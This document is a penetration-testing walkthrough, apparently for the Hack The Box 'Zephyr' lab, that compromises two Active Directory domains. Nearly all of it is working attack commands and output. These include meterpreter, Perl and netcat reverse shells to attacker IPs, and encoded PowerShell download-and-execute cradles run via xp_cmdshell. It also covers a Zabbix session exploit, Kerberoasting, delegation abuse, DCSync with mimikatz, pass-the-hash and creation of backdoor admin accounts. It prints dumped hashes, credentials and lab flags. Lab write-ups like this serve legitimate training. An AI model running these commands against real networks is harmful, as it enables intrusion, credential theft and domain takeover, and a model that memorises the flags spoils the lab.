# Zephyr

{% code overflow="wrap" %}
```powershell
# IP Subnet
10.10.110.0/24
# Entry Host
10.10.110.35
painters.htb
# Email Addresses
info@painters.htb
# Users
Thomas Bishop
James Ray
Toby Harlington

# mail Server
mail.painters.htb, IP Address:192.168.110.51
# Certificate Authority
zsm-ZPH-SVRCA01-CA
# Attempt to fuzz parameters. 
ffuf -u 'https://painters.htb/views/service.php?FUZZ=1' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 5846

# Credentials
PAINTERS\riley
P@ssw0rd
# Privesc
SSH_CONNECTION=10.10.14.3 36916 192.168.110.51 22
Potentially Vulnerable to CVE-2022-2588

blake:x:1002:1002:Blake Morris,,,:/home/blake:/bin/bash                                                                                                                                                               
daniel:x:1001:1001:Daniel Morris,,,:/home/daniel:/bin/bash                                                                                                                                                            
matt:x:1000:1000:Matt Fisher:/home/matt:/bin/bash                                                                                                                                                                     
riley:x:1003:1003:Riley Smart,,,:/home/riley:/bin/bash                                                                                                                                                                
root:x:0:0:root:/root:/bin/bash

# Find the Domain Controller
sudo proxychains nmap -sT -Pn -n 192.168.110.0/24 -p 389
# Confirm the linux account works with the Domain Controller
proxychains crackmapexec smb 192.168.110.55 -u riley -p 'P@ssw0rd'
# Run bloodhound
proxychains bloodhound-python -d painters.htb -u riley -p 'P@ssw0rd' -dc dc.painters.htb -c DCOnly -ns 192.168.110.55 --dns-tcp
# nmap scans
## 192.168.110.52
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds



# shares DC
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 

ssh -D 1080 riley@$ip -fN  
P@ssw0rd
# Kerberoastable
blake
web_svc
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 192.168.110.55 painters.htb/riley -outputfile hashes.kerberoast

```
{% endcode %}

## Introduction

{% code overflow="wrap" %}
```bash
ssh riley@$ip
P@ssw0rd
# Create shell to upload
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f elf > shell.elf
# Make shell executeable
chmod +x shell.elf
# Copy shell to linux host
scp shell.elf riley@$ip:/tmp/shell.elf
# In Meterpreter 
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lport 443
run
# Run shell in background
./shell.elf&


run autoroute -s 192.168.110.0/24

```
{% endcode %}

## Credentials

### Passwords

```bash
# Zabbix Database
zabbix:rDhHbBEfh35sMbkY
# Internal domain mssql_svc account. 
internal\mssql_svc:ToughPasswordToCrack123!
```

### Hashes

```bash
# Zabbix Database
Admin:$2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q
guest:$2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
marcus:$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.
```

## Disclosure

```bash
# Connect with evil-winrm
proxychains evil-winrm -i 192.168.110.52 -u web_svc -p '!QAZ1qaz'

# Hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# SharpHound
.\SharpHound.exe -d painters.htb --ldapusername riley --ldappassword P@ssw0rd
James:8af1903d3c80d3552a84b6ba296db2ea
```

## Persistence (PNT-SVRBPA)

{% code overflow="wrap" %}
```bash
# Use James hash from previous host
proxychains evil-winrm -i 192.168.110.53 -u james -H 8af1903d3c80d3552a84b6ba296db2ea

# Hash dump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:23ea5ff648e7ec7dcd1bfef8e9434099:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# SharpHound
.\SharpHound.exe -d painters.htb --ldapusername riley --ldappassword P@ssw0rd
```
{% endcode %}

## Blake - User account

{% code overflow="wrap" %}
```bash
# Login using a system shell to PNT-SVRBPA
# System Shell
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py james@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
# James Shell
proxychains evil-winrm -i 192.168.110.53 -u james -H 8af1903d3c80d3552a84b6ba296db2ea
upload /home/kali/share/PowerView.ps1
# Run PowerShell in system shell
powershell

# Change User password
## Connect as system
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py james@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
# Import PowerView
cd \Windows\Tasks
powershell
. .\PowerView.ps1
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity blake -AccountPassword $UserPassword -Credential $Cred
```
{% endcode %}

## DC

{% code overflow="wrap" %}
```bash
# On .53 from Meterpreter
# Request ticket
.\Rubeus.exe s4u /user:blake /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:"cifs/dc.painters.htb" /altservice:http,host,ldap /ptt
# Run mimikatz
mimikatz.exe
# Perform dcsync
lsadump::dcsync /domain:painters.htb /all
```
{% endcode %}

## ZSM.LOCAL Domain

### Enumeration

#### Alive Hosts

```bash
192.168.210.1 - Maybe Router?!?
192.168.210.10 - ZPH-SRVDC01 - Domain Controller
192.168.210.11 - ZPH-SRVMGMT1 - ???
192.168.210.12 - ZPH-SVRCA01 - Web Server / Certificate server?!? 
192.168.210.13 - Zabbix
192.168.210.14 - ZPH-SVRCA01 - adfs.zsm.local
192.168.210.15 - ZPH-SVRSQL01 - SQL
192.168.210.16 - ZPH-SVRCDC01 - Child Domain Controller?!?
192.168.210.17 - ZPH-SVRCHR - !?!
192.168.210.18 - ZPH-SVRCSUP - 
```

#### Port Scans

{% code overflow="wrap" %}
```bash
# 192.168.210.11
PORT    STATE SERVICE       REASON          VERSION
135/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
445/tcp open  microsoft-ds? syn-ack ttl 128
# 192.168.210.12
PORT    STATE SERVICE       REASON          VERSION
80/tcp  open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack ttl 128
# 192.168.210.13
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
443/tcp open  ssl/http syn-ack ttl 64 nginx 1.18.0 (Ubuntu)
# 192.168.210.14
PORT    STATE SERVICE       REASON          VERSION
80/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
135/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
443/tcp open  https?        syn-ack ttl 128
445/tcp open  microsoft-ds? syn-ack ttl 128
# 192.168.210.15
PORT     STATE SERVICE       REASON          VERSION           
135/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack ttl 128
1433/tcp open  ms-sql-s      syn-ack ttl 128 Microsoft SQL Server  15.00.2000.00
# 192.168.210.16
PORT     STATE SERVICE       REASON          VERSION              
53/tcp   open  domain?       syn-ack ttl 128                                                               
88/tcp   open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos
135/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn                                                                         
389/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds? syn-ack ttl 128                      
464/tcp  open  kpasswd5?     syn-ack ttl 128                      
593/tcp  open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0                                                                   
636/tcp  open  ssl/ldap      syn-ack ttl 128 Microsoft Windows Active Directory LDAP  
3268/tcp open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      syn-ack ttl 128 Microsoft Windows Active Directory LDAP
# 192.168.210.17
PORT     STATE SERVICE REASON          VERSION
5985/tcp open  http    syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

```
{% endcode %}

### Credentials

```bash
marcuss:!QAZ2wsx
```

### Monitor

#### Console Access

{% code overflow="wrap" %}
```bash
# Download Exploit
wget https://raw.githubusercontent.com/Mr-xn/cve-2022-23131/main/zabbix_session_exp.py
# Uncomment all print statements. 
# Run exploit
proxychains python3 zabbix_session_exp.py -t https://monitor.zsm.local/index_sso.php -u Admin
# Ignore error message then copy cookie into browser and click on SSO button. 
```
{% endcode %}

Access to Zabbix Server

{% code overflow="wrap" %}
```bash
# In console navigate to Administration -> Scripts -> Create script
# Set scope = 'Manual host action', type = Script, Execute on = 'Server (proxy)'
perl -e 'use Socket;$i="10.10.16.207";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```
{% endcode %}

#### Root

```bash
# Can run nmap as sudo so use GTFO bins.
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl-z
stty raw -echo
fg <enter>
stty rows 69 columns 287
```

#### Post Exploitation

{% code overflow="wrap" %}
```bash
# Enumerate database
marcuss:!QAZ2wsx
# Create metasploit console session.
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.16.207 LPORT=443 -f elf > shell.elf
mv shell.elf /home/kali/share/
# Download shell
cd /dev/shm
wget 10.10.16.207/shell.elf
# Make shell executeable
chmod +x shell.elf
# In Meterpreter 
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lport 443
run
# Run shell in background
./shell.elf&
# Setup proxy
use auxiliary/server/socks_proxy
set version 4a
set srvport 8888
run
# Bring back session
sessions -i 1
run autoroute -s 192.168.210.0/24
```
{% endcode %}

### Diverted - ZPH-SVRMGMT1

#### Enumeration

Bloodhound shows

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
proxychains python3 pywhisker.py -t 'ZPH-SVRMGMT1$' -a add -d zsm.local -u marcus -p '!QAZ2wsx' --dc-ip 192.168.210.10 -f cert -e PEM

proxychains python3 gettgtpkinit.py -cert-pem cert_cert.pem -key-pem cert_priv.pem zsm.local/ZPH-SVRMGMT1$ ZPH-SVRMGMT1$.ccache -dc-ip 192.168.210.10

export KRB5CCNAME=ZPH-SVRMGMT1\$.ccache

proxychains python3 getnthash.py -key b3739c44aded934869c55018f989a07a46da243bd789fbd17024c97466e3fb9d zsm.local/ZPH-SVRMGMT1$ -dc-ip 192.168.210.10

77a8c4abe4fa18606666dfa8c303ddf0
835edf11f5527e13ae63c6846f8f0670
af6c7b9c3130414cef9023c2a393e85c
proxychains pth-net rpc group addmem 'GENERAL MANAGEMENT@ZSM.LOCAL' 'marcus' -U zsm.local/'ZPH-SVRMGMT1$'%ffffffffffffffffffffffffffffffff:77a8c4abe4fa18606666dfa8c303ddf0 -S 192.168.210.10

proxychains pth-net rpc group addmem 'GENERAL MANAGEMENT@ZSM.LOCAL' 'marcus' -U zsm.local/'ZPH-SVRMGMT1$'%ffffffffffffffffffffffffffffffff:77a8c4abe4fa18606666dfa8c303ddf0 -S 192.168.210.10
proxychains rpcclient -U zsm.local/marcus 192.168.210.10
setuserinfo2 jamie 23 P@ssw0rd
quit

type C:\Users\Administrator\Desktop\flag.txt
ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}

Administrator:500:aad3b435b51404eeaad3b435b51404ee:545c503123664e5713439e088bd91035
proxychains pth-net rpc group addmem 'CA MANAGERS@ZSM.LOCAL' 'ZPH-SVRMGMT1$' -U zsm.local/jamie -S 192.168.210.10
```
{% endcode %}

## ZPH-SVRCA01

{% code overflow="wrap" %}
```bash
# Add Jamie to the CA Managers group
proxychains net rpc group addmem 'CA MANAGERS@ZSM.LOCAL' 'jamie' -U zsm.local/jamie -S 192.168.210.10
# Upload tools
upload /home/kali/share/PowerView.ps1
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/Powermad.ps1
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/PsExec64.exe
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/nc64.exe
upload /home/kali/data/Rubeus.exe
# Start new shell
start /b nc64.exe -e cmd.exe 10.10.16.207 80
# Add new machine account
New-MachineAccount -MachineAccount sexytimes -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
# Setup RBCD Stuff
$ComputerSid = Get-DomainComputer sexytimes -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# Set Credential for Set-Object command to run as
$SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ZSM\jamie', $SecPassword)
# Update computer object
Get-DomainComputer ZPH-SVRCA01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $Cred

# Request Ticket with alternative services
Rubeus.exe s4u /user:sexytimes$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/ZPH-SVRCA01.zsm.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt

# Add user account
PsExec64.exe \\ZPH-SVRCA01.zsm.local net user haxor P@ssw0rd /add
PsExec64.exe \\ZPH-SVRCA01.zsm.local net localgroup "Administrators" haxor /add
type \\ZPH-SVRCA01.zsm.local\c$\Users\Administrator\Desktop\flag.txt
ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}

# Hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f027f0fcf9a7470a9276a6484eb336f9
haxor:1000:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6

ZSM.LOCAL/Administrator:$DCC2$10240#
Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6

[NL$1 - 03/04/2023 17:42:45]
RID       : 000001f4 (500)
User      : ZSM\Administrator
MsCacheV2 : 04a13c983d1c6f2ee43cc9aa0c4d49c6

ZPH-SVRCA01$:ac8f63681a7cb83c659350f7b73f409a
```
{% endcode %}

## The Statement - ZPH-SVRSQL01

{% code overflow="wrap" %}
```bash
# Use zabbix database creds to connect
proxychains /usr/share/doc/python3-impacket/examples/mssqlclient.py 'zabbix'@192.168.210.15
# Enable command execution
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# Setup metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lport 443
run
# 
EXEC xp_cmdshell 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgAwADcALwBzAGgAZQBsAGwANgA0AC4AdAB4AHQAIgApACAAfAAgAEkARQBYAA==';
```
{% endcode %}

### Privilege Escalation

```bash
# Upload tools
cd /Windows/Tasks
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/SpoolSample.exe




```

### Post Exploitation

```bash
cd /windows/tasks
upload /home/kali/share/mimikatz.exe
upload /home/kali/share/mimidrv.sys

# Hashes
Administrator:7ac325190bb999ef4ad73b0b67e8e33c
ZPH-SVRSQL01$:d36f5182149612b1f77bb48c3dd454d9

# Flag
type C:\Users\Administrator\Desktop\flag.txt
ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}
```

## The Missing Link - ZSM-SRVCSSQL02

### Exploitation

{% code overflow="wrap" %}
```bash
# On SQL01 impersonate sa account
EXECUTE AS login = 'sa'; SELECT SYSTEM_USER;
# The use linked queries. 
select myuser from openquery("ZSM-SVRCSQL02", 'select SYSTEM_USER as myuser');
# Enable xp_cmdshell
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [ZSM-SVRCSQL02]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [ZSM-SVRCSQL02]
# Verify command execution
EXEC ('xp_cmdshell ''whoami'';') AT [ZSM-SVRCSQL02]
EXEC ('xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgAwADkALwBzAGgAZQBsAGwANgA0AC4AdAB4AHQAIgApACAAfAAgAEkARQBYAA=='';') AT [ZSM-SVRCSQL02]

```
{% endcode %}

### Privlege Escalation

```
cd /windows/tasks
upload /home/kali/data/PetitPotato.exe
PetitPotato.exe 3 cmd
```

### Post Exploitation

{% code overflow="wrap" %}
```bash
# Flag
ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}
# Hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5dc71607c06cf83eea0f3d789bce419c
ZSM-SRVCSSQL02$:6ecbe72f6d071d3c6793369ecb44865b

```
{% endcode %}
